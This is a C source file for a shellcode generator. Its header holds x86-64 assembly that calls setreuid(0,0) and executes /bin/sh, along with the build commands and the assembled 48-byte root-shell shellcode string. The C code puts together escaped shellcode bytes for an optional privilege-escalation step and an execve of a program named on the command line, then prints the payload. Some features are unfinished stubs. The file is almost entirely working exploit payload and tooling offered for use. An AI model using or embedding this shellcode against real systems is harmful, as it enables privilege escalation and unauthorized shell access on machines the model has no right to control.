/********************************************************
 * Created by antz					
 * I must add a lot of functionalities...coming soon    
 
 The skeleton of shellcode used in the c program is taken by this simple asm program that 
 tries to elevate its privileges to root (in the next days I'm going to implement a generic privilege escalation with 
 a uid choosen by the user) before to exec a shell
 *********************************************************
 Written by antz
 
 bits 64
SECTION .text
global _start
_start:

;clean main registers

		xor rax, rax
		xor rdi, rdi
		xor rsi, rsi
		xor rdx, rdx

;setreuid(uid_t ruid, uid_t euid)    opcode 0x71;
;rdi and rsi are already set to 0 
;it tries to become root

		mov al, 0x71
		syscall
		
		xor rax, rax
;execve
		jmp down
up:
		pop rdi
		push rax
		mov rdx, rsp
		push rdi
		mov rsi, rsp
		add rax, 0x3b
		syscall
down:
		call up
		db "/bin/sh"
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;nasm -f elf64 -o test.o test.nasm
;ld -m elf_x86_64 -o test test.o
;for i in $(objdump -d test| grep "^ "|cut -f2); do echo -n '\x'$i;done;echo
;"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb0\x71\x0f\x05\x48\x31\xc0\xeb\x0f\x5f\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05\xe8\xec\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"   
;(LEN = 48)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 */

#include "main.h"


void cleanRegs(char *shellcode)
{
	snprintf(shellcode, LEN_CLEAN_REGS, (unsigned char *)"\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2");
}

void privEsc(char *shellcode, int uid[])
{
	if(!uid[0] && !uid[1])
	{
		snprintf(&shellcode[strlen(shellcode)], LEN_SETREUID, (unsigned char*)"\\xb0\\x71\\x0f\\x05");
	}
	else
	{
		//Coming soon..
		/*max value =  (2^16)-1
		mov di, 65535	; opcode 66 bf ff ff
		mov si, 65535	; opcode 66 bf ff ff
		
		..I must manage null-bytes for some values..
		mov di, 202;	; opcode 66 bf ca 00
		mov si, 216;	; opcdoe 66 be d8 00
		*/
	}
}

void makeExec(char *shellcode, char *program, size_t size)
{
	snprintf(&shellcode[strlen(shellcode)], LEN_EXECVE, (unsigned char *) "\\x48\\x31\\xc0\\xeb\\x0f\\x5f\\x50\\x48"
																			"\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83"
																			"\\xc0\\x3b\\x0f\\x05\\xe8\\xec\\xff\\xff\\xff");
	strncat(shellcode, program, size);
}


void usage(){exit(EXIT_FAILURE);}//Coming soon

void banner(){}//Coming soon



int main(int argc, char **argv)
{
	int i, c, p = 0, u = 0, uid[] = {0,0};
	char srArgs[LEN_UIDS];
	size_t lenProgr;
	unsigned char *program, *shellcode;

	banner();
	if(argc < 2){usage();}

	while((c = getopt(argc, argv, ":p:u:")) != -1)
	{
		switch(c)
		{
			case 'p':
						p = 1;
						lenProgr = strlen(optarg) * 4;
						program = (unsigned char*) malloc(sizeof(unsigned char)*lenProgr+1);
						memset(program,0x0, sizeof(unsigned char)*lenProgr+1);
						
						for(i=0; i < lenProgr/4; i++)
  						{
							snprintf(&program[i*4], (sizeof(unsigned char)*lenProgr+1)-(i*4),"\\x%02x", (unsigned char*)optarg[i]);
						}

						program[lenProgr] = '\0';
						break;
			
			case 'u':
						u = 1;

						strncpy(srArgs,optarg, LEN_UIDS);
						srArgs[strlen(srArgs)] = '\0';
						char *ptr;
						if(!strcmp(srArgs,"root"))
						{
							break;
						}
						else if(strstr(srArgs,",") == NULL){usage();}
						
						strtok_r(srArgs, ",", &ptr);
						uid[0] = atoi(srArgs);
						uid[1] = atoi(ptr);
						break;
			default:
						usage();
						break;
		}
	}



	if(!p){usage();}
	

	shellcode = (unsigned char*) malloc(sizeof(unsigned char)*(LEN_CLEAN_REGS + LEN_EXECVE + lenProgr + 1));
	
	if(shellcode == NULL)
	{
		printf("Error\n");
		exit(EXIT_FAILURE);
	}

	memset(shellcode,0x0,sizeof(unsigned char)*(LEN_CLEAN_REGS + LEN_EXECVE + lenProgr + 1));

	if(u)
	{
		cleanRegs(shellcode);
		privEsc(shellcode, uid);
	}

	makeExec(shellcode, program, lenProgr);
	
	printf("\"%s\"\nLen: %u\n", shellcode, strlen(shellcode)/4);

	free(program);
	free(shellcode);
	exit(EXIT_SUCCESS);
}



